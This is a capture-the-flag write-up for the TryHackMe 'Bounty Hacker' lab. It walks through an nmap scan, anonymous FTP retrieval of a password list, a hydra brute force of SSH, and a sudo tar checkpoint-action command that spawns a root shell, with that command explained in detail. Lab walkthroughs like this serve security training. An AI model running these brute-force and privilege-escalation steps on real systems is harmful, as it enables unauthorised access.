<div align="center">

# Bounty Hacker

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/FTP-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/Bruteforce-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/cowboyhacker)

</div> <br/>

## `./recon`

Port scan performed via nmap

```bash
nmap -sS <ip> -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

ftp, ssh and http open. Starting with port 80

<br/>

## `./enum`

Checked the main page

```bash
curl <ip>
```

A Cowboy Bebop themed page, nothing technically useful in the text itself

Ran gobuster to look for directories and files

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x http,txt,php

/images               (Status: 301) [--> /images/]
/index.html           (Status: 200)
/javascript           (Status: 301) [--> /javascript/]
```

`/javascript` returns 403 Forbidden. `/images` has directory listing enabled — found `crew.jpg`, nothing useful for further progress

<br/>

## `./ftp`

Port 80 gave no leads, went back to ftp. Tried anonymous login

```bash
ftp <ip>

Name (<ip>:root): anonymous
230 Login successful.
```

Two files found in the root

```bash
ls

locks.txt
task.txt
```

Both downloaded

```bash
mget locks.txt task.txt
```

<br/>

## `./credentials`

Contents of `task.txt`

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The signature `-lin` is a likely username

Contents of `locks.txt` — a list of a few dozen strings, all variations of "Red Dragon Syndicate" with letters swapped for numbers and special characters

Both files combined into a username/password-list pair for a bruteforce attempt

<br/>

## `./bruteforce`

Ran hydra against ssh with the username `lin` and the password list from `locks.txt`

```bash
hydra -l lin -P locks.txt ssh://<ip>

[22][ssh] host: <ip>   login: lin   password: RedDr4gonSynd1cat3
```

Password found

<br/>

## `./access`

Logged in via ssh with the found credentials

```bash
ssh lin@<ip>
```

Found `user.txt` in the home directory

```bash
cat user.txt
```

First flag captured ✅

<br/>

## `./privesc`

Checked permissions with sudo

```bash
sudo --list

User lin may run the following commands on ip-10-130-167-13:
    (root) /bin/tar
```

`lin` can run `/bin/tar` as root. Found a way to get a shell via [GTFOBins (tar)](https://gtfobins.org/gtfobins/tar/)

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Breaking down the command:

1. **`sudo tar cf /dev/null /dev/null`** — starts creating an archive. To avoid wasting time and disk space on real compression, the virtual empty device `/dev/null` is used as both the destination (where to write) and the source (what to archive)
2. **`--checkpoint=1`** — a service flag that makes the utility trigger a checkpoint after every written block of data (1 block = 10 KB by default)
3. **`--checkpoint-action=exec=/bin/sh`** — defines the action to run when the checkpoint is hit — launching the `/bin/sh` shell

On startup, `tar` immediately builds minimal archive metadata and writes the first block to the target `/dev/null`. The block counter instantly reaches `1`, the trigger fires, and `tar` executes `exec=/bin/sh`.

Since the `tar` process itself was launched via `sudo`, the shell it spawned inherited root privileges — a root shell obtained

<br/>

## `./root`

Confirmed privileges

```bash
sudo -l

User root may run the following commands on ip-10-130-167-13:
    (ALL : ALL) ALL
```

Located the final flag

```bash
find / -name root.txt 2>/dev/null

/root/root.txt
```

```bash
cat root.txt
```

Second flag captured ✅